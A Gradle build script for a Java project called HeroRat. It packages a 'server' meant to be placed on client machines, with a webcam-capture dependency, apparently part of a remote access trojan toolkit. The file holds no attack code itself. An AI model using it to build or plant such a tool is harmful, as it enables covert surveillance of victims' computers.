description = "Builds the HeroRat server to be placed on clients machines"

// Apply the java plugin to add support for Java
apply plugin: 'java'

sourceSets{
    main{
        java {
            srcDir 'src'
        }
        resources {
            srcDir 'resources'
        }

    }
}

// In this section you declare where to find the dependencies of your project
repositories {
    flatDir{
        dirs 'lib'
    }
}

// In this section you declare the dependencies for your production and test code
dependencies {
    compile name: 'webcam-capture-0.3.10'
    compile name: 'slf4j-api-1.7.12'
}

jar {
    manifest {
        attributes 'Main-Class': 'net.herorat.Main'
    }

    from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }

}

task buildJarOut( type:Copy, dependsOn:'jar' ){
    from('build/libs/'){
        include 'HeroRat_Server.jar'
        rename 'HeroRat_Server.jar','blank_server.jar'
    }
    into '../HeroRat/resources/lib'
}

buildJarOut.mustRunAfter jar
